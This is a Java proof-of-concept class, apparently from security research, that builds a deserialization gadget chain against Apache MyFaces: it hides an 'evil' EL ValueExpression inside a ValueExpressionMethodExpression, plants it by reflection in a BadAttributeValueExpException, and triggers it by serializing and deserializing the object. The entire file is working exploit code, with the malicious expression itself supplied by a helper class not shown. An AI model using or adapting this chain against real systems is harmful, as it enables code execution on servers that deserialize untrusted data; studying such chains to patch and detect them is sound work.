package com.example.Myface;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;

import javax.el.ValueExpression;
import javax.management.BadAttributeValueExpException;

public class POC_4 {

    public static void main(String[] args) throws Exception {
        ValueExpression normal = Share.getValueExpression();
        ValueExpression evil = Share.getEvilExpression();
        ValueExpressionMethodExpression expression = new ValueExpressionMethodExpression(normal);

        BadAttributeValueExpException bad = new BadAttributeValueExpException("1");
        ReflectionUtil.setField(bad, "val", expression);

        ReflectionUtil.setField(expression, "valueExpression", evil);
        SerializeUtil.deserialize(SerializeUtil.serialize(bad));
    }

}
